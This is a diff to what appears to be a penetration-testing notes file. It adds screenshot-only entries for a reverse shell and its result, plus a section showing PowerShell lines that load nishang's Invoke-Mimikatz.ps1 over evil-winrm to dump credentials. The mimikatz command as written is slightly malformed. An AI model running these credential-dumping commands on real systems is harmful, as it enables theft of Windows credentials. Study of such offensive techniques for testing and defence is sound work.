@@ -1960,7 +1960,33 @@ x86_64-w64-mingw32-g++ -static -O2 -o sebug.exe sedebug.cpp
 
 <img width="1001" height="286" alt="image" src="https://github.com/user-attachments/assets/ee526607-a33f-481b-8844-f0ce84c10b59" />
 
-- 
+- Reverse shell-:
+
+<img width="1864" height="608" alt="image" src="https://github.com/user-attachments/assets/b0e1d2a8-3cdb-4d84-8175-1dbffbd228ea" />
+
+- Result-:
+
+<img width="505" height="106" alt="image" src="https://github.com/user-attachments/assets/cb76f6c1-c218-42ed-bacf-3f86d716f89b" />
+
+------------
+
+### Running mimikatz with evil-winrm
+
+--------------
+
+- Use [Invoke-Mimikatz.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1)
+
+```cmd
+Import-Module .\Invoke-Mimikatz.ps1
+Invoke-Mimikatz -Command '"privilege:debug"'
+```
+
+<img width="1127" height="583" alt="image" src="https://github.com/user-attachments/assets/c940c753-1e7f-4da9-8665-d5dcdb0f3937" />
+
+-----------------
 
 
 
+
+
+---------------
